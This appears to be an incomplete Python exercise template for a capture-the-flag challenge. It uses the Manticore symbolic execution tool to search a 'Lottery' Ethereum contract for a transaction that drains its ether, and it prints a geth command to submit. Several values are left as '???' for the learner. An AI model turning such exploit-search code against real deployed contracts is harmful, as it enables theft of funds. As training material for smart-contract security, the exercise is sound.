from manticore.ethereum import ABI, ManticoreEVM
import binascii
import sys
import sha3

m = ManticoreEVM()
m.verbosity(0)
# We need to get the addresses for our wallet and the CTF contract. These will be strings in hex format
from_address = int(sys.argv[1], 16) if len(sys.argv)>1 else "<your address here>"
si_level_address = int(sys.argv[2], 16) if len(sys.argv)>2 else "<SI ctf level address>"
sol_file = sys.argv[3] if len(sys.argv)>3 else "../SI_ctf_levels/Lottery.sol"
gas = 100000
# We need to know how much ether is in the contract. This value will be an int and is in wei
contract_balance = ???
# We need to give our contract a msg value. This value will be in wei
msg_value = ???

# read in the contract source
with open(sol_file, "r") as f:
    contract_src = f.read()

# instantiate manticore's Ethereum Virtual Machine
m = ManticoreEVM()

# create a virtual user account on the EVM
user_account = m.create_account(address=from_address, balance=contract_balance+ msg_value)
print('Created virtual user account...')

# create our contract
contract_account = m.solidity_create_contract(
    contract_src, # a string containing the source file
    contract_name="Lottery", # the contract in the source file that we want to create (a file could have multiple contracts)
    owner=user_account, # the creator address for this first exploit, we can use our own account to create it (this may not be true for future levels)
    balance=contract_balance, # the value to send to the contructor (this will actually be deducted from our virtual address)
    args=(0,0) # in the downloaded contract, these arguments aren't used
     )
print('Created contract...')

# This will be our data constraint in our transaction
buff = m.make_symbolic_buffer(???)
# Now, we constrain the execution with a transaction
m.transaction(caller=user_account, address=contract_account.address, data=buff, value = msg_value, gas=gas)


# for states that are still running (haven't reverted due to our transaction contraint) let's iterate through them and see if any allow for an exploit
for state in m.running_states:
    # this is just some silly manticore stuff
    world = state.platform
    # stealing back all the ether is a good way of proving that an exploit exists
    if state.can_be_true(world.get_balance(user_account.address) == contract_balance + msg_value):
        state.constraints.add(world.get_balance(user_account.address) == contract_balance + msg_value)
        result = state.solve_one(buff)
        # print out our transaction
        print("eth.sendTransaction({data:\"0x"+binascii.hexlify(result).decode('utf-8')+"\", from:\""+ hex(from_address) +
            "\", to:\""+hex(si_level_address)+"\", value:"+str(msg_value)+", gas:"+str(gas)+"})")
        # this prints the exploit out in a format that you can easily paste into geth to win
        sys.exit(0) # we only needed one state!
    print('No state found')
